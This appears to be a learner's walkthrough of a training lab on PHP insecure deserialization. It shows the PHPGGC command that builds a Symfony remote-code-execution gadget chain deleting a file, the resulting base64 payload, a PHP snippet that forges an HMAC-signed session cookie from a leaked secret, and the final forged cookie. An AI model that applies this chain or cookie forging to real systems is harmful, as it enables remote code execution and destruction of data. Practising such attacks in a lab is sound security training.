# Practitioner Lab 101: Exploiting PHP deserialization with a pre-built gadget chain

---

This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.

To solve the lab, identify the target framework then use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, work out how to generate a valid signed cookie containing your malicious object. Finally, pass this into the website to delete the `morale.txt` file from Carlos's home directory.

You can log in to your own account using the following credentials: `wiener:peter`

![Untitled](Practitioner%20Lab%20101%20Exploiting%20PHP%20deserializatio%20afed8c4730b54c20aeef1260f7c24844/Untitled.png)

I initially thought it was zendframework but when I put a payload it gave me the following output.

Using this output I will try to generate a new payload. 

as can be seen 

```
{"token":"Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJpbGQybmwyZWtnM3Y2M28xbWhnZDhkMWtmc3JqaG8xdiI7fQ==","sig_hmac_sha1":"29edb44d2f8049047702392a017c09ffcd55630c"}
```

the token has a base64 payload and a signature. 

![Untitled](Practitioner%20Lab%20101%20Exploiting%20PHP%20deserializatio%20afed8c4730b54c20aeef1260f7c24844/Untitled%201.png)

The secret key is this.

The base64 payload would be what the PHPGGC gives me. 

![Untitled](Practitioner%20Lab%20101%20Exploiting%20PHP%20deserializatio%20afed8c4730b54c20aeef1260f7c24844/Untitled%202.png)

Looking at all of the payloads I have here one of them that makes the most snese is RCE4 but there are others that can also be used.

![Untitled](Practitioner%20Lab%20101%20Exploiting%20PHP%20deserializatio%20afed8c4730b54c20aeef1260f7c24844/Untitled%203.png)

After running the command inside of the phpgcc directory

```
./phpggc Symfony/RCE4  exec 'rm /home/carlos/morale.txt'|base64
```

i got the payload and the key

payload = Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==

key= evckwno64jo5ohpguulol38em6e9ppm7

now I got a previous request and just put the values in 

![Untitled](Practitioner%20Lab%20101%20Exploiting%20PHP%20deserializatio%20afed8c4730b54c20aeef1260f7c24844/Untitled%204.png)

```
<?php
$object = "OBJECT-GENERATED-BY-PHPGGC";
$secretKey = "LEAKED-SECRET-KEY-FROM-PHPINFO.PHP";
$cookie = urlencode('{"token":"' . $object . '","sig_hmac_sha1":"' . hash_hmac('sha1', $object, $secretKey) . '"}');
echo $cookie;
```

The code above can also be used.

and this gave me the following payload.

```
{"token":"Tzo0NzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxUYWdBd2FyZUFkYXB0ZXIiOjI6e3M6NTc6IgBTeW1mb255XENvbXBvbmVudFxDYWNoZVxBZGFwdGVyXFRhZ0F3YXJlQWRhcHRlcgBkZWZlcnJlZCI7YToxOntpOjA7TzozMzoiU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQ2FjaGVJdGVtIjoyOntzOjExOiIAKgBwb29sSGFzaCI7aToxO3M6MTI6IgAqAGlubmVySXRlbSI7czoyNjoicm0gL2hvbWUvY2FybG9zL21vcmFsZS50eHQiO319czo1MzoiAFN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcVGFnQXdhcmVBZGFwdGVyAHBvb2wiO086NDQ6IlN5bWZvbnlcQ29tcG9uZW50XENhY2hlXEFkYXB0ZXJcUHJveHlBZGFwdGVyIjoyOntzOjU0OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAcG9vbEhhc2giO2k6MTtzOjU4OiIAU3ltZm9ueVxDb21wb25lbnRcQ2FjaGVcQWRhcHRlclxQcm94eUFkYXB0ZXIAc2V0SW5uZXJJdGVtIjtzOjQ6ImV4ZWMiO319Cg==","sig_hmac_sha1":"08d4658245260679b920452f568fb4783709e1df"}
```

and when i put this into the cookie and url encoded it, it solved the lab.